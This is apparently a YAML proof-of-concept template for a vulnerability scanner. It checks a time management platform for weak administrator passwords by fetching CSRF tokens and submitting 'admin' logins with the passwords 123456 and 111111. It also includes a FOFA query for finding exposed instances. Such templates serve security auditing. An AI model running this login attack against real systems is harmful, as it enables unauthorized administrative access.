id: poc-yaml-time-refinement-ms-weak-password
info:
  name: 时间精细化管理平台 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 时间精细化管理平台
  fofa: body="/iclock/accounts/login/"
variables:
  passwd: '123456

    111111

    '
requests:
- method: GET
  path: /accounts/login/?next=/iclock/imanager
  expression: status_code == 200
  output:
  - regex_match(headers,"csrftoken=(?P<csrf>.*?);")
  - regex_match(headers,"(?P<token>[0-9a-zA-Z]{64})")
- method: POST
  path: /iclock/accounts/login/
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: csrftoken={{.csrf}}
  data: username=admin&password={{.passwd}}&logintype=user&csrfmiddlewaretoken={{.token}}
  expression: status_code == 200 && contains(body,"message") && contains(body,"\"ret\"\x3a
    0") && contains(headers,"sessionid=")
transport: http
